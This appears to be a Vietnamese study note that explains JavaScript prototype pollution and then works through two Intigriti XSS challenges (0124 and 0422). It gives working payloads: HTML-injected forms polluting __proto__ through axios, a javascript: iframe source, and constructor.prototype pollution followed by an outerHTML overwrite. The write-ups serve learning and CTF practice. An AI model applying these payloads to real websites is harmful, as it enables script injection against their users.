# Task 6


## Phân tích lỗ hổng Prototype Pollution


![image](https://hackmd.io/_uploads/By7H_gD4Jg.png)

- Để khởi tạo một object ta có nhiều cách khác nhau 

1. Sử dụng Object Literal:

```javascript!
const person = {
  firstName: "John",
  lastName: "Doe",
  age: 50,
  eyeColor: "blue"
};
```

hoặc:

```javascript!
const person = {};
person.firstName = "John";
person.lastName = "Doe";
person.age = 50;
person.eyeColor = "blue";
```

2. Sử dụng Keyword new

```javascript!
const person = new Object();
person.firstName = "John";
person.lastName = "Doe";
person.age = 50;
person.eyeColor = "blue";
```

3. Thông qua kế thừa từ một object khác bằng cách sử dụng ```Object.create()```

```javascript!
var user = Object.create(person);
```


4. constructor function

- mỗi class (lớp) trong JavaScript được thể hiện dưới dạng function (hàm):
```javascript!
function Person(name, age) {
    this.name = name;
    this.age = age;
    this.introduce = function () {
        console.log("Xin chào, tôi là " + this.name + " và tôi " + this.age + " tuổi.");
    };
}

var person = new Person("John", 25);
```

### Prototype Inheriance
- Cũng giống như trong Java, C# sử dụng extend class để định nghĩa đối tượng. Trong Javascript sử dụng một mô hình kế thừa dựa trên các nguyên mẫu (prototype).
- Trong JS các Object tự động kế thừa các thuộc tính của nguyên mẫu

- https://www.youtube.com/watch?v=W9_x8pc_bh8

![image](https://hackmd.io/_uploads/Hy45xnwV1x.png)


- Một đối tượng a được liên kết với một đối tượng b thì đối tượng b được gọi là nguyên mẫu (prototype) của a.
- Trong JS, mặc định một Object sẽ tự động được gán các nguyên mẫu tích hợp sẵn.

```javascript!
let myObject = {};
Object.getPrototypeOf(myObject);    // Object.prototype
 
let myString = "";
Object.getPrototypeOf(myString);    // String.prototype
 
let myArray = [];
Object.getPrototypeOf(myArray);     // Array.prototype
 
let myNumber = 1;
Object.getPrototypeOf(myNumber);    // Number.prototype
```

- Trong JS các Object tự động kế thừa các thuộc tính của nguyên mẫu (trừ khi chúng có một thuộc tính riêng cùng một key được xác định trước)

![image](https://hackmd.io/_uploads/HyPOTgP4yl.png)

- Đối tượng trong JavaScript cũng có thể kế thừa từ các prototype, cho phép tái sử dụng mã nguồn và chia sẻ các thuộc tính và phương thức giữa các đối tượng khác nhau.

```javascript!
function Person(name) {
  this.name = name;
}

Person.prototype.introduce = function() {
  console.log("Xin chào, tôi là " + this.name + ".");
};

var person1 = new Person("John");
person1.introduce(); // Kết quả: "Xin chào, tôi là John."
```

- Trong ví dụ này định nghĩa một constructor function Person và thêm phương thức introduce vào prototype của nó. Đối tượng mới person1 được tạo từ Person sẽ kế thừa từ prototype và có thể sử dụng phương thức introduce.

- Dựa theo cách hoạt động của mô hình prototypal inheritance, khi chúng ta gọi một thuộc tính từ đối tượng, JavaScript sẽ hiển thị giá trị bằng cách truy xuất thuộc tính đó "từ thấp lên cao". Chẳng hạn, khi được yêu cầu hiển thị ```foo.temp```, nếu giá trị này không tồn tại sẽ tìm tới ```foo.__proto__.temp```, không tồn tại sẽ tiếp tục tìm tới ```foo.__proto__.__proto__.temp``` ... cho tới khi gặp giá trị ```null``` mới dừng lại.

```javascript
foo.temp; // undefined
foo.__proto__.temp; // undefined
foo.__proto__.__proto__.temp; // undefined
...
// null
```
### Prototype Pollution

- Prototype Pollution là Ô nhiễm nguyên mẫu. Đây là một lỗ hổng bảo mật xảy ra khi tấn công vào việc thay đổi đối tượng prototype trong JavaScript một cách không an toàn. Điều này có thể xảy ra khi các đối tượng JavaScript cho phép việc mở rộng và chỉnh sửa prototype của chúng.

- Cụ thể nguyên mẫu mà mình cần làm ô nhiễm đó chính là Object.prototype , bởi vì khi prototype của một đối tượng được sửa đổi một cách không an toàn, các thuộc tính hoặc phương thức có thể được thêm, thay đổi hoặc xóa một cách không mong muốn. Điều này có thể dẫn đến những hậu quả nghiêm trọng, bao gồm việc thay đổi hoạt động của các đối tượng đã tồn tại, gây ra lỗi trong mã nguồn và thậm chí tiềm ẩn các lỗ hổng bảo mật.

- Lỗ hổng prototype pollution thường xảy ra khi một hàm JavaScript kết hợp một đối tượng chứa các thuộc tính có thể điều khiển bởi người dùng vào một đối tượng hiện có mà không trước tiên làm sạch các khóa(key). Điều này cho phép kẻ tấn công inject một thuộc tính với khóa như __proto__ , cùng với các thuộc tính lồng nhau tùy ý.

- Do ý nghĩa đặc biệt của __proto__ trong ngữ cảnh JavaScript, quá trình kết hợp có thể gán các thuộc tính lồng nhau vào prototype của đối tượng thay vì đối tượng mục tiêu. Kết quả, kẻ tấn công có thể gây ra prototype pollution với các thuộc tính chứa giá trị nguy hiểm, sau đó có thể được ứng dụng sử dụng một cách nguy hiểm.

- Có thể ô nhiễm bất kỳ nguyên mẫu nào, nhưng điều này thường xảy ra với đối tượng nguyên mẫu toàn cục được tích hợp sẵn ```Object.prototype```

- Tác động của ô nhiễm nguyên mẫu phụ thuộc vào ứng dụng

![image](https://hackmd.io/_uploads/HJ5phTwVJx.png)

- ở clientside -> hunting XSS
    - Client-side prototype pollution xảy ra khi ứng dụng web cho phép người dùng kiểm soát các thuộc tính hoặc giá trị của prototype phía client. Kẻ tấn công có thể lợi dụng lỗ hổng này nhằm thay đổi các thuộc tính quan trọng trong prototype, gây ảnh hưởng đến hành vi của ứng dụng và có thể dẫn đến các cuộc tấn công khác như XSS (Cross-Site Scripting) hoặc CSRF (Cross-Site Request Forgery).
- ở serverside -> hunting kiểm soát truy cập và thực thi code

|Thuộc tính	|```.prototype```|	```.__proto__```|
|---|---|---|
|Là của ai?	|Thuộc tính của constructor function	|Thuộc tính của mọi đối tượng|
|Vai trò	|Định nghĩa các phương thức cho đối tượng|	Trỏ đến prototype mà đối tượng kế thừa|
|Thay đổi được?|Có thể thay đổi	|Có thể thay đổi (không nên lạm dụng)
|Sử dụng khi nào?|	Khi định nghĩa phương thức cho đối tượng mới|	Khi kiểm tra hoặc truy cập chuỗi prototype|

-  cần hàm assign() và merge() để có thể gán objject thì mới trigger được Prototype Pollution => Tuy nhiên, trong thực tế, các ứng dụng dễ bị lỗ hổng này thường ngầm sử dụng các thao tác đó, ví dụ:
    - Object.assign: Thường được dùng để sao chép hoặc gộp các đối tượng.
    - merge: Thường xuất hiện trong các thư viện phổ biến như lodash (các phiên bản cũ) hoặc deepmerge.

![image](https://hackmd.io/_uploads/SJHu5pwNke.png)



- Ví dụ Prototype Pollution xảy ra trên URL như ```https://vulnerable-website.com/?__proto__[evilProperty]=payload``` vì trong nhiều ứng dụng web, các tham số URL được chuyển trực tiếp vào một đối tượng JavaScript (ví dụ: req.query trong Express.js). Nếu không có kiểm tra hoặc xử lý phù hợp, tham số ```__proto__``` có thể được chuyển thành một thuộc tính có khả năng thay đổi chuỗi prototype (prototype chain).

### Phòng tránh

![image](https://hackmd.io/_uploads/S1cSspDN1e.png)


## challenge-0124.intigriti.io

- mục tiêu của bài là tìm cách thực thi lệnh javascript bất kì trong thẻ iFramed 

![image](https://hackmd.io/_uploads/HyiKldB4Jg.png)

### Phân tích 


- app có 2 api là ```/```  và ```/search```

```javascript!
app.get("/", (req, res) => {
    if (!req.query.name) {
        res.render("index");
	return;
    }
    res.render("search", {
        name: DOMPurify.sanitize(req.query.name, { SANITIZE_DOM: false }),
        search: req.query.search
    });
});
```

- tại api ```/```: chấp nhận các yêu cầu GET. Nếu không có name tham số, nó sẽ render index. Nếu có , nó sẽ render search.
- hàm ```DOMPurify``` sanitize chỉ được sử dụng trên một trong hai tham số truy vấn ( ```name``` nhưng không phải ```search```). Hơn nữa, tùy chọn này { ```SANITIZE_DOM: false``` }được cung cấp.

- vì Hàm DOMPurify.sanitize xử lý bằng cách xóa hoàn toàn những phần tử nguy hiểm như ```<script>``` hoặc các thuộc tính có khả năng chứa mã độc (như onerror, onload, v.v.), chứ không mã hóa đầu ra nên vẫn có tồn tại HTML injection

![image](https://hackmd.io/_uploads/Hk-sXqBVJe.png)


```javascript!
app.post("/search", (req, res) => {
    name = req.body.q;
    repo = {};

    for (let item of repos.items) {
        if (item.full_name && item.full_name.includes(name)) {
            repo = item
	    break;
        }
    }
    res.json(repo);
});
```

- Điểm cuối thứ hai là ```/search```, chấp nhận các yêu cầu POST. Nó lấy một tham số ```q``` trở thành ```name``` và tham chiếu đến ```repo```. Về cơ bản, hàm sẽ tìm kiếm danh sách ```repos``` tên khớp. Nếu tìm thấy, nó sẽ trả về kết quả dưới dạng đối tượng JSON.

- và cuối cùng là phần xử lý javascript phía client có gán đối tượng và có thể khai thác prototype pollution 

```javascript!
<%- include("inc/header"); %>
<h2>Hey <%- name %>,<br>Which repo are you looking for?</h2>

<form id="search">
    <input name="q" value="<%= search %>">
</form>

<hr>

<img src="/static/img/loading.gif" class="loading" width="50px" hidden><br>
<img class="avatar" width="35%">
<p id="description"></p>
<iframe id="homepage" hidden></iframe>

<script src="/static/js/axios.min.js"></script>
<script src="/static/js/jquery-3.7.1.min.js"></script>
<script>
    function search(name) {
        $("img.loading").attr("hidden", false);

        axios.post("/search", $("#search").get(0), {
            "headers": { "Content-Type": "application/json" }
        }).then((d) => {
            $("img.loading").attr("hidden", true);
            const repo = d.data;
            if (!repo.owner) {
                alert("Not found!");
                return;
            };

            $("img.avatar").attr("src", repo.owner.avatar_url);
            $("#description").text(repo.description);
            if (repo.homepage && repo.homepage.startsWith("https://")) {
                $("#homepage").attr({
                    "src": repo.homepage,
                    "hidden": false
                });
            };
        });
    };

    window.onload = () => {
        const params = new URLSearchParams(location.search);
        if (params.get("search")) search();

        $("#search").submit((e) => {
            e.preventDefault();
            search();
        });
    };
</script>
</body>
</html>
```

- khi chúng ta tìm kiếm hàm ```search()``` sẽ được thực thi khi đó:
    - Yêu cầu POST được thực hiện đến ```/search``` điểm cuối
    - Nếu truy vấn tìm kiếm khớp, dữ liệu kho lưu trữ có liên quan sẽ được trả về ở định dạng JSON
    - Nguồn img.avatarsẽ được thiết lập thànhrepo.owner.avatar_url
    - description sẽ được thiết lập thành repo.description

- để ý ```$("#search").get(0)``` sẽ lấy phần tử form có id là 'search'  đầu tiên.Và tận dụng HTML injection, nếu chúng ta có thể inject searchform của riêng mình trước form hiện có trên trang, form đó sẽ được xử lý trong yêu cầu axios thay vì form dự định 

```htmlembedded=
<form id="search"><input name="cuong" value="cuong" /></form>
```

![image](https://hackmd.io/_uploads/SJOwqcSV1x.png)

- để ý ```axios.post()``` form của chúng ta đi và cách axios xử lý form có tồn tại lỗ hổng  prototype pollution trong hàm formDataToJSON()
- formDataToJSON() nó chuyển đổi các giá trị của tham số sang định dạng JSON và vô tình trigger   prototype pollution khi tham số đầu vào là độc hại


![image](https://hackmd.io/_uploads/HJqx8CB4kx.png)


```htmlembedded=
name=<form id="search"><input name="__proto__[cuong]" value="cuong" /></form>&search=cuong
```

- trigger thành công prototype vậy tất cả các đối tượng sẽ kế thừa thuộc tính được tiêm của chúng ta 

![image](https://hackmd.io/_uploads/ryg6xRBVkx.png)

- Nếu ```repo.owner``` không thiết lập, hàm sẽ trả về và chúng ta không bao giờ có thể tiếp cận được mã dễ bị tấn công

![image](https://hackmd.io/_uploads/S14O70HNJg.png)


```javascript!
const repo = d.data;
            if (!repo.owner) {
                alert("Not found!");
                return;
            };
```

- chúng ta làm ô nhiễm nguyên mẫu để bao gồm một ```owner```. Vì ```repo``` là một đối tượng, nó sẽ kế thừa thuộc tính tạo nên ```repo.owner == cuong``` với payload

```javascript!
name=
<form id="search"><input name="__proto__[owner]" value="cuong" /></form>
&search=cuong
```

![image](https://hackmd.io/_uploads/H1tbN0BVyg.png)

```javascript!
$("img.avatar").attr("src", repo.owner.avatar_url);
            $("#description").text(repo.description);
            if (repo.homepage && repo.homepage.startsWith("https://")) {
                $("#homepage").attr({
                    "src": repo.homepage,
                    "hidden": false
                });
            };
```
- tiếp đến để trigger được XSS chúng ta cần truyền được payload vào src của thẻ iframe thông qua  ```repo.homepage``` với payload


```javascript!
name=<form id="search"><input name="__proto__[owner]" value="cuong" /><input name="__proto__[homepage]" value="https://cuong.com"/></form>&search=cuong
```

![image](https://hackmd.io/_uploads/B1f_O0HN1x.png)

![image](https://hackmd.io/_uploads/r1KAd0B4ke.png)

- Nếu chúng ta có thể thiết lập repo.homepagethành ```javascript:alert(document.domain)```, chúng ta đã hoàn thành rồi. Thật không may, dường như không có cách nào để giải quyết tình trạng này ```repo.homepage.startsWith("https://")``` .

-  vì các thuộc tính HTML không phân biệt chữ hoa chữ thường và JS thì không , chúng ta có thể sử dụng thủ thuật viết hoa đáng tin cậy của mình để đảm bảo khóa hiện có sẽ không ghi đè lên nguyên mẫu đã tiêm của chúng ta.
- và với payload sau có thể trigger được XSS

```javascript!
name=<form id="search"><input name="__proto__[SRC]" value="javascript:alert(document.domain)" /><input name="__proto__[owner]" value="cuong" /><input name="__proto__[homepage]" value="https://cuong.com"/></form>&search=cuong
```

![image](https://hackmd.io/_uploads/H1pmjABN1e.png)

![image](https://hackmd.io/_uploads/rkZOn0BVJe.png)

## challenge-0422.intigriti.io

- mục tiêu của bài là tìm cách thực thi lệnh javascript bất kì trong thẻ iFramed 

### Phân tích 

![image](https://hackmd.io/_uploads/BkV3EKU4yg.png)

- nhập trong tin vào và generate thấy có 1 GET request đến https://challenge-0422.intigriti.io/challenge/Window%20Maker.html?config%5Bwindow-name%5D=%3Ch1%3Ecuong%3C%2Fh1%3E&config%5Bwindow-content%5D=%3Ch1%3Ecuong%3C%2Fh1%3E&config%5Bwindow-toolbar%5D%5B0%5D=min&config%5Bwindow-toolbar%5D%5B1%5D=max&config%5Bwindow-toolbar%5D%5B2%5D=close&config%5Bwindow-statusbar%5D=true

![image](https://hackmd.io/_uploads/r1DI8FL4Jx.png)



- đầu ra đã được xử lý để không bị HTMLi

```javascript!
function sanitize(data) {
          if (typeof data !== 'string') return data
          return data.replace(/[<>%&\$\s\\]/g, '_').replace(/script/gi, '_')
        }
```

- Hàm sanitization thay thế một số ký tự nguy hiểm (và thẻ script) từ đầu vào của chúng ta; tuy nhiên chúng ta cũng có thể thấy rằng "sanitization" này chỉ được thực hiện nếu chúng ta truyền một chuỗi, nếu không, dữ liệu đầu vào tương tự sẽ được trả về mà không có bất kỳ sửa đổi nào. Vì vậy, nếu chúng ta truyền một mảng thay vì một giá trị duy nhất, chúng ta sẽ có thể bỏ qua sanitization.

```javascript!
config[window-name][]=<h1>cuong</h1>&config[window-content][]=<h1>cuong</h1>&config[window-toolbar][0]=min&config[window-toolbar][1]=max&config[window-toolbar][2]=close&config[window-statusbar]=true
```

- chúng ta có thể bỏ qua hàm sanitize, nhưng thẻ HTML của chúng ta không được hiển thị


![image](https://hackmd.io/_uploads/Hklu58tL4kx.png)

```javascript!
function main() {
	const qs = m.parseQueryString(location.search)
	
	let appConfig = Object.create(null)
	appConfig["version"] = 1337
	appConfig["mode"] = "production"
	appConfig["window-name"] = "Window"
	appConfig["window-content"] = "default content"
	appConfig["window-toolbar"] = ["close"]
	appConfig["window-statusbar"] = false
	appConfig["customMode"] = false
	
	if (qs.config) {
	merge(appConfig, qs.config)
	appConfig["customMode"] = true
}
```

-  chuỗi truy vấn của chúng ta đang được phân tích cú pháp và sau đó một hàm merge

```javascript
if (checkHost()) {
	devSettings["isTestHostOrPort"] = true
	merge(devSettings, qs.settings)
}

...

if (!appConfig["customMode"]) {
	m.mount(devSettings.root, App)
} else {
	m.mount(devSettings.root, {view: function() {
		return m(CustomizedApp, {
			name: appConfig["window-name"],
			content: appConfig["window-content"] ,
			options: appConfig["window-toolbar"],
			status: appConfig["window-statusbar"]
		})
	}})
}
```

- có thể thấy rằng đối tượng ```devSettings``` chứa thuộc tính ```root``` là phần tử gốc của trang HTML của chúng ta được truyền cho hàm mount cùng với các đầu vào của chúng ta. Vì vậy, nếu chúng ta có thể kiểm soát ```devSettings``` bằng cách nào đó, chúng ta có thể sửa đổi nó để đạt được XSS (tức là bằng cách đưa tải trọng của chúng ta vào một phần tử HTML hiện có). Chúng ta có thể làm điều đó bằng cách tận dụng hàm merge, nhưng vấn đề là chúng ta cần phải tiếp cận lệnh merge(devSettings, qs.settings), được "bảo vệ" bởi ```checkHost()```.

- hàm checkHost() như sau

```javascript!
function checkHost() {
	const temp = location.host.split(':')
	const hostname = temp[0]
	const port = Number(temp[1]) || 443
	return hostname === 'localhost' || port === 8080
}
```
- Trong trường hợp này, chúng ta muốn thỏa mãn điều kiện hostname === 'localhost' || port === 8080để hàm trả về true

- Để bypass checkHost(), chúng ta có thể khai thác lỗ hổng ô nhiễm nguyên mẫu trong hàm merge

```javascript
function merge(target, source) {
	let protectedKeys = ['__proto__', "mode", "version", "location", "src", "data", "m"]

	for(let key in source) {
		if (protectedKeys.includes(key)) continue

		if (isPrimitive(target[key])) {
		target[key] = sanitize(source[key])
		} else {
			merge(target[key], source[key])
		}
	}
}
```    

- Trong hàm này, dữ liệu đầu vào của chúng ta được merge với target, do đó nếu chúng ta có thể làm ô nhiễm nguyên mẫu Mảng thì chúng ta cũng có thể làm ô nhiễm temp mảng (mảng sẽ kế thừa thuộc tính "bị ô nhiễm") được sử dụng để kiểm tra điều kiện mà chúng ta quan tâm.

- config[window-toolbar] là một mảng, vì vậy chúng ta có thể sử dụng nó để làm ô nhiễm nguyên mẫu Array.

Vì ```__proto__``` từ khóa bị từ chối, chúng ta cần tìm một cách khác để làm ô nhiễm nguyên mẫu Mảng, có thể thực hiện bằng cách sử dụng payload sau:

```
config[window-toolbar][constructor][prototype][1]=8080
```

- Chúng ta đang sử dụng các thuộc tính ```constructor``` và ```prototype``` của ```window-toolbar``` , để đạt đến nguyên mẫu Mảng và đặt giá trị ```8080``` cho phần tử thứ 2. Theo cách này, hàm checkHost()sẽ trả về true vì ```Number(temp[1])``` sẽ giải quyết thành số nguyên 8080 ( temp"thừa hưởng" giá trị 8080 ở chỉ mục 1 từ nguyên mẫu của nó).

- Tiếp đến ghi đè đối tượng ```devSettings.root```
- Bây giờ chúng ta cũng có thể kiểm soát devSettingsđối tượng ( mergeđược gọi lại), được sử dụng khi xây dựng trang. Chúng ta cần tìm cách để đưa một số mã JavaScript sẽ được kích hoạt khi người dùng truy cập liên kết với payload XSS ```<style onload%3Dalert(document.domain)>```
- ghi đè outerHTML thuộc tính của phần tử HTLM thứ 2 và chúng ta cũng phải thêm  ```[0]``` vào cuối outerHTML để có thể bỏ qua hàm sanitize (hàm này sẽ không thay thế contents nếu đầu vào không phải là chuỗi, trong trường hợp của chúng tôi là một mảng).
- và payload cuối cùng như sau:

```http!
https://challenge-0422.intigriti.io/challenge/Window%20Maker.html?config[window-toolbar][constructor][prototype][1]=8080&settings[root][ownerDocument][body][outerHTML][0]=%3Cstyle%20onload%3Dalert(document.domain)%3E
```


![image](https://hackmd.io/_uploads/ByZnaKU4Jl.png)
